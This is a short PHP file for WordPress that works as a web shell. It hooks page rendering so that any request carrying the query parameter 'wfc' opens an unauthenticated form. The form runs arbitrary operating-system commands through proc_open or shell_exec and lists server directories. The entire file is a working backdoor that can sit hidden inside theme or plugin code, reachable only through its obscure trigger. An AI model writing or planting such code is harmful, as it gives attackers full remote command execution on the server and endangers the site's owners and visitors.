<?php
add_action('template_redirect', function () {

    if (!isset($_GET['wfc'])) return;

    // Base current working directory (can change with "cd")
    $cwd = getcwd();
    if (isset($_POST['cwd'])) {
        $cwd = $_POST['cwd'];
        if (is_dir($cwd)) chdir($cwd);
    }

    $cmd = $_POST['cmd'] ?? '';
    $output = '';
    $error = '';
    $exit_code = 0;

    if ($cmd) {
        $descriptorspec = [
            0 => ["pipe", "r"], // stdin
            1 => ["pipe", "w"], // stdout
            2 => ["pipe", "w"]  // stderr
        ];

        $process = @proc_open($cmd, $descriptorspec, $pipes);

        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $exit_code = proc_close($process);
        } else {
            $output = shell_exec($cmd . ' 2>&1');
        }
    }

    $current_dir = getcwd();
    ?>

    <!DOCTYPE html>
    <html>
    <head>
        <title>proc open shell</title>
        <style>
            body { font-family: monospace; background: #111; color: #eee; }
            input, textarea, button { width: 100%; background: #222; color: #eee; border: 1px solid #555; margin: 5px 0; }
            textarea { height: 200px; }
            .output { background: #000; color: #0f0; padding: 10px; white-space: pre; }
        </style>
    </head>
    <body>
        <h2>PHP proc open</h2>
        <form method="POST">
            <label>Current Directory:</label>
            <input type="text" name="cwd" value="<?php echo htmlspecialchars($current_dir); ?>" />
            <label>Command:</label>
            <input type="text" name="cmd" value="" />
            <button type="submit">Run</button>
        </form>

        <?php if ($cmd): ?>
            <h3>Command: <?php echo htmlspecialchars($cmd); ?></h3>
            <div class="output">
                <strong>STDOUT:</strong>
                <?php echo htmlspecialchars($output); ?>

                <br><strong>STDERR:</strong>
                <?php echo htmlspecialchars($error); ?>

                <br><strong>Exit Code:</strong> <?php echo intval($exit_code); ?>
            </div>
        <?php endif; ?>

        <h3>Directory Listing</h3>
        <div class="output">
            <?php
            $files = scandir($current_dir);
            foreach ($files as $f) {
                echo $f . "\n";
            }
            ?>
        </div>
    </body>
    </html>

    <?php
    exit;
});
